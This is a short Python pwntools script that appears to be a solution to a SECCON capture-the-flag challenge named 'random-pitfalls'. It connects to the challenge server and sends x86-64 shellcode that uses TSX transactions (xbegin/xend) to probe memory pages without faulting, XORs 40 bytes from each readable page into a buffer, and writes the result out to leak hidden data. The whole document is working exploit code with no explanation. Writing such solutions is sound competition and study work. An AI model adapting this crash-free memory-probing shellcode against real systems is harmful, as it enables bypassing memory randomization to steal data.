#!/usr/bin/env python
# coding: utf-8

from pwn import *

p = remote('random-pitfalls.chal.seccon.jp', 10101)

sc = '''
start:

cmp r15, 64
jz end
jmp test
retaddr1:
cmp rax, 1
jnz endloop

mov r14, 0
mov r12, rdi
mov r13, rsi
doxor:
cmp r14, 40
jz endloop
mov al, [r12]
xor [r13], al
add r12, 1
add r13, 1
add r14, 1
jmp doxor

endloop:
add r15, 1
add rdi, 0x1000
jmp start

test:
mov eax, 0xFFFFFFFF
xbegin fail
mov rax, [rdi]
xend
jmp success
fail:
mov rax, 0
jmp retaddr1
success:
mov rax, 1
jmp retaddr1

end:
mov rdi, 1
mov rdx, 40
mov rax, 1
syscall
'''
payload = asm(sc, arch='amd64').ljust(4060, '\0')
p.send(payload)
p.interactive()
